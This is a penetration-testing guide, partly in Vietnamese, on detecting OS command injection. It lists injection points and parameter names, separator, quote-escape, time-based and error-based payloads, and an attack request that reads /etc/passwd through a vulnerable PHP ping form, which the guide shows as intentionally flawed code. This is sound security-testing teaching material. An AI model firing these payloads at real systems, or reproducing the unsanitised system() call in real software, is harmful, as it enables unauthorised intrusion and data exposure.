# Command Injection Detection

## Injection Points

### Common Locations

| Location | Description | Example |
|----------|-------------|---------|
| **URL Parameter** | GET query string | `?ip=127.0.0.1` |
| **POST Form Data** | Form submission | `ping_host=192.168.1.1` |
| **POST JSON/XML** | API requests | `{"host": "target.com"}` |
| **Cookie** | Session/preference data | `Cookie: lang=en` |
| **HTTP Headers** | User-Agent, Referer, X-Forwarded-For | `User-Agent: curl/7.68.0` |
| **File Upload** | Filename, file content | `filename="test;id.txt"` |

### Top 25 Vulnerable Parameter Names

Các tham số sau thường được target vì hay được dùng trong system commands:

```
?cmd={payload}          ?exec={payload}         ?command={payload}
?execute={payload}      ?ping={payload}         ?query={payload}
?jump={payload}         ?code={payload}         ?reg={payload}
?do={payload}           ?func={payload}         ?arg={payload}
?option={payload}       ?load={payload}         ?process={payload}
?step={payload}         ?read={payload}         ?function={payload}
?req={payload}          ?feature={payload}      ?exe={payload}
?module={payload}       ?payload={payload}      ?run={payload}
?print={payload}
```

## Detection Methodology

### Step 1: Xác định Injection Context

Trước khi test, cần xác định input đang nằm trong context nào:

| Context | Original Command | Detection Approach |
|---------|------------------|---------------------|
| Unquoted | `ping $ip` | Thử trực tiếp `;id` |
| Single-quoted | `ping '$ip'` | Escape với `';id #` |
| Double-quoted | `ping "$ip"` | Escape với `";id #` |

### Step 2: Basic Detection Payloads

**Cross-platform (Windows + Linux):**

```bash
# Pipe operator
| whoami
|whoami

# OR operator (execute if previous fails)
|| whoami
||whoami

# AND operator (execute if previous succeeds)
&& whoami
&&whoami

# Background execution
& whoami
&whoami
```

**Linux-specific:**

```bash
# Semicolon (sequential)
; whoami
;whoami

# Newline
%0a whoami
%0awhoami

# Command substitution
`whoami`
$(whoami)
```

### Step 3: Quoted Context Escape

Khi input nằm trong quotes, cần escape trước:

```bash
# Single quote context: ping '$ip'
'| whoami
'; whoami #
'|| whoami #
'`whoami`'

# Double quote context: ping "$ip"
"| whoami
"; whoami #
"|| whoami #
"$(whoami)"
```

### Step 4: Time-based Detection (Blind)

Khi không thấy output, sử dụng time delay để confirm:

**Linux:**

```bash
; sleep 5
| sleep 5
|| sleep 5 #
`sleep 5`
$(sleep 5)

# Ping-based (network delay)
; ping -c 10 127.0.0.1
| ping -c 10 127.0.0.1
```

**Windows:**

```cmd
& ping -n 10 127.0.0.1
| ping -n 10 127.0.0.1
|| ping -n 10 127.0.0.1

# PowerShell
& powershell Start-Sleep -s 5
```

**Quan sát**: Nếu response delay tương ứng với sleep time → vulnerable.

### Step 5: Error-based Detection

Inject payload gây error để detect:

```bash
# Division by zero (một số systems)
; expr 1 / 0

# Invalid command
; invalidcommand12345

# File not found
; cat /nonexistent/file
```

Kiểm tra error message trong response.

## HTTP Request Example

### Vulnerable Request

```http
POST /network/ping HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

host=192.168.1.1
```

**Backend code (vulnerable):**

```php
<?php
$host = $_POST['host'];
system("ping -c 4 " . $host);
?>
```

### Attack Request

```http
POST /network/ping HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

host=192.168.1.1;cat /etc/passwd
```

**Resulting command:**

```bash
ping -c 4 192.168.1.1;cat /etc/passwd
```

## Detection Workflow Diagram

```
┌────────────────────────────────────────────────────────────────┐
│                  DETECTION METHODOLOGY                          │
├────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────┐                                            │
│  │ Identify Input  │                                            │
│  │ Parameters      │                                            │
│  └────────┬────────┘                                            │
│           │                                                      │
│           ▼                                                      │
│  ┌─────────────────┐    ┌──────────────────────────────────┐   │
│  │ Test Basic      │    │ Payloads to try:                 │   │
│  │ Separators      │───►│ ; | || && & ` $() %0a            │   │
│  └────────┬────────┘    └──────────────────────────────────┘   │
│           │                                                      │
│           ▼                                                      │
│  ┌─────────────────┐  No   ┌─────────────────────────────┐     │
│  │ Output visible? │──────►│ Try Time-based:             │     │
│  └────────┬────────┘       │ sleep 5, ping -c 10         │     │
│           │ Yes            └─────────────┬───────────────┘     │
│           ▼                              │                      │
│  ┌─────────────────┐                     ▼                      │
│  │ Confirm with    │           ┌─────────────────────────┐     │
│  │ id, whoami      │           │ Response delayed?       │     │
│  └────────┬────────┘           └─────────────┬───────────┘     │
│           │                                  │ Yes              │
│           ▼                                  ▼                  │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                 CONFIRMED VULNERABLE                     │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                  │
└────────────────────────────────────────────────────────────────┘
```

## OS Identification

Sau khi confirm injection, xác định OS:

| Command | Linux Response | Windows Response |
|---------|----------------|------------------|
| `whoami` | `www-data`, `apache` | `hostname\username` |
| `uname -a` | Kernel info | Command not found |
| `ver` | Command not found | Windows version |
| `cat /etc/passwd` | File contents | Command not found |
| `type C:\Windows\win.ini` | Command not found | File contents |

## Quick Detection Checklist

1. [ ] Xác định tất cả input parameters
2. [ ] Test basic separators: `; | || && &`
3. [ ] Test command substitution: `` ` `` và `$()`
4. [ ] Test URL-encoded newline: `%0a`
5. [ ] Nếu không có output → test time-based
6. [ ] Nếu có filter → thử bypass techniques
7. [ ] Xác định OS (Linux vs Windows)
8. [ ] Document injection point và working payload
